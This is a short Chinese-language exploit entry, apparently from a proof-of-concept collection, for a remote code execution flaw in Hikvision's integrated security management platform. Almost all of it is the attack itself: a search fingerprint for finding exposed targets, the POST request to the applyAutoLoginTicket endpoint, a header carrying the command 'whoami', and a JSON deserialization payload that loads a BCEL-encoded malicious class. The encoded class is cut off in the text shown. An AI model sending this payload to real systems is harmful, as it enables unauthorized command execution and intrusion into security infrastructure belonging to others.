# 海康威视综合安防管理平台AutoLoginTicket远程代码执行漏洞

- **系统**：海康　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="HIKVISION-综合安防管理平台"`
- **请求**：`POST /bic/ssoService/v1/applyAutoLoginTicket HTTP/1.1`
- **关键头**：`Host: {{Hostname}}`　`Content-Type: application/json`　`Testcmd: whoami`　`Content-Length: 5727`

**请求体 / payload**
```
{"CTGT":{ "a": {"@type": "java.lang.Class","val": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource"},"b": {"@type": "java.lang.Class","val": "com.sun.org.apache.bcel.internal.util.ClassLoader"},"c": {"@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource","driverClassLoader": {"@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"},"driverClassName": "$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$a5Wyx$Ug$Z$ff$cd$5e3$3b$99$90dCB$W$uG$N$b09v$b7$a1$95B$c2$99$90$40J$S$u$hK$97P$db$c9$ec$q$3bd3$Tfg$J$a0$b6$k$d4$D$8fZ$8f$daPO$b4$ae$b7P$eb$s$U9$eaA$b1Z$8fzT$ad$d6zk$f1$f6$8f$da$f6$B$7c$bf$99$N$d9$84$ad$3c$3e$sy$be…（脚本共 5726 字，完整版见原文）
```